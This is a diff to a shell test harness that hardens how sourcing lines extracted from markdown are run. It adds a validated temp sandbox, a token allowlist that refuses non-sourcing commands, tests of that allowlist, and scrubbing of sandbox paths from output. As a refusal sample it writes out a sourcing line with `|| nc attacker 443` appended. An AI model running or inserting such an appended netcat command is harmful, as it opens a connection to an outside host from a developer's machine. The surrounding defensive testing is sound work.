@@ -47,7 +47,11 @@ check() { # check <desc> <expected> <actual>
   if [ "$2" = "$3" ]; then pass "$1 (= $3)"; else fail "$1 (expected '$2', got '$3')"; fi
 }
 
-SANDBOX=$(mktemp -d 2>/dev/null || mktemp -d -t adlc-srcguard)
+# LESSON-441's full-path template (BSD and GNU agree on it), single arm, and the
+# result is validated BEFORE any `rm -rf "$SANDBOX/..."` can be derived from it:
+# an empty SANDBOX would turn those into `rm -rf /a`.
+SANDBOX=$(mktemp -d "${TMPDIR:-/tmp}/adlc-srcguard.XXXXXX") || { echo "source-guard.test.sh: mktemp failed" >&2; exit 1; }
+[ -n "$SANDBOX" ] && [ -d "$SANDBOX" ] || { echo "source-guard.test.sh: sandbox path invalid" >&2; exit 1; }
 trap 'rm -rf "$SANDBOX"' EXIT INT TERM
 
 OUT="$SANDBOX/out"
@@ -62,6 +66,24 @@ extract() { # prints distinct sourcing lines, leading whitespace stripped
     grep -hv '^[[:space:]]*#' "$ROOT"/partials/*.sh 2>/dev/null; } \
   | sed 's/^[[:space:]]*//' \
   | grep -E '^(\. |source |\[ -f |if \[ -f ).*partials/[a-z0-9-]+\.sh' | sort -u
+}
+
+# Execution allowlist (REQ-610 security review). Extraction is a loose prefix
+# match over markdown, and every extracted line is handed to a real shell with
+# only HOME and cwd sandboxed — uid, PATH, network and the absolute filesystem
+# are the developer's own. So a line reaches a shell ONLY if every
+# whitespace-separated token is a sourcing construct: the guard keywords, `.`,
+# `source`, `sh`, the two convention paths, `2>/dev/null`, and list operators.
+# `[ -f .adlc/partials/x.sh ] || nc attacker 443` extracts, but `nc` is not a
+# token here, so it is REFUSED with a FAIL and never executed. The lint's
+# unguarded-source rule is deliberately NOT the gate for this — it only sees
+# dot-sources of convention paths, not arbitrary trailing commands.
+TOKEN_RE='^(if|then|else|fi|\.|source|sh|\[|-f|\]|\];|;|\|\||&&|2>/dev/null|(\.adlc/partials/|~/\.claude/skills/partials/)[a-z0-9-]+\.sh;?)$'
+conforms() { # conforms <line> — 0 iff every token is allowlisted
+  if printf '%s\n' "$1" | tr '\t' ' ' | tr -s ' ' '\n' | grep -vqE "$TOKEN_RE"; then
+    return 1
+  fi
+  return 0
 }
 
 names_of() { # names_of <line> — the distinct <name>s the line references
@@ -178,7 +200,7 @@ NLINES=$(grep -c . "$LINES_FILE")
 if [ "$NLINES" -eq 0 ]; then
   # A rotted regex, a moved file family, or a bad $ROOT would otherwise make this
   # harness exit 0 having tested nothing at all.
-  fail "vacuous_extraction_fails: extraction from $ROOT yielded zero partial-sourcing lines"
+  fail "vacuous_extraction_fails: extraction from $(basename "$ROOT") yielded zero partial-sourcing lines"
 else
   pass "vacuous_extraction_fails: extraction yielded $NLINES distinct line(s)"
 fi
@@ -198,11 +220,29 @@ else
   fail "emit_step_telemetry_self_source_extracted: the delegate-tools-path self-source in emit-step-telemetry.sh was not extracted (leg='$PARTIAL_LEG')"
 fi
 
+# The allowlist itself is tested in both directions before anything runs: a
+# canonical line must conform (or the whole harness would refuse the corpus),
+# and a line carrying a foreign command after a sourcing construct must not.
+if conforms 'if [ -f .adlc/partials/forge.sh ]; then . .adlc/partials/forge.sh; else . ~/.claude/skills/partials/forge.sh; fi'; then
+  pass "allowlist_accepts_canonical: the canonical spelling conforms"
+else
+  fail "allowlist_accepts_canonical: the canonical spelling was refused — TOKEN_RE is wrong"
+fi
+if conforms '[ -f .adlc/partials/forge.sh ] || nc attacker 443'; then
+  fail "allowlist_refuses_foreign_command: a line with a non-sourcing command conformed"
+else
+  pass "allowlist_refuses_foreign_command: non-sourcing command refused"
+fi
+
 # ===========================================================================
 # 2. Every extracted line, under $SUT, in cases (a)-(c)
 # ===========================================================================
 while IFS= read -r line; do
   [ -n "$line" ] || continue
+  if ! conforms "$line"; then
+    fail "refused_nonconforming_line: not a pure sourcing construct, NOT executed: $line"
+    continue
+  fi
   case_a_fallback_sourced "$line"
   case_b_local_only "$line"
   case_c_loud_when_both_absent "$line"
@@ -237,6 +277,11 @@ fi
 #    its source line and reach its own standalone-run guard (AC-8). forge.sh is a
 #    fake that defines the two adapter functions the block would call if it ever
 #    got that far; it never does — the guard exits 0 first.
+#    This is the ONE place a whole fence body is executed rather than an
+#    allowlisted sourcing line. It is the fence /architect runs in production with
+#    the developer's real HOME and cwd, so a hostile change to it is a hostile
+#    change to the skill itself; here it runs with both sandboxed and no
+#    pipeline-state.json, which is strictly less exposure than a normal run.
 # ===========================================================================
 case_f_architect_step5_under_sh() {
   work="$SANDBOX/f/work"; fake_home="$SANDBOX/f/home"
@@ -253,7 +298,9 @@ case_f_architect_step5_under_sh() {
   if grep -qF 'standalone run, skipping footprint publish' "$OUT" && [ "$rc" -eq 0 ]; then
     pass "case_f_architect_step5_under_sh: fence ran past its source line under $SUT (rc=0, standalone guard reached)"
   else
-    fail "case_f_architect_step5_under_sh: expected the standalone-run line and rc=0 under $SUT, got rc=$rc stdout='$(cat "$OUT")' stderr='$(cat "$ERR")'"
+    # Sandbox paths are scrubbed from the captured output before it is printed
+    # (BUG-054 class: absolute temp paths in transcripts).
+    fail "case_f_architect_step5_under_sh: expected the standalone-run line and rc=0 under $SUT, got rc=$rc stdout='$(sed "s#$SANDBOX#<sandbox>#g" "$OUT")' stderr='$(sed "s#$SANDBOX#<sandbox>#g" "$ERR")'"
   fi
 }
 case_f_architect_step5_under_sh
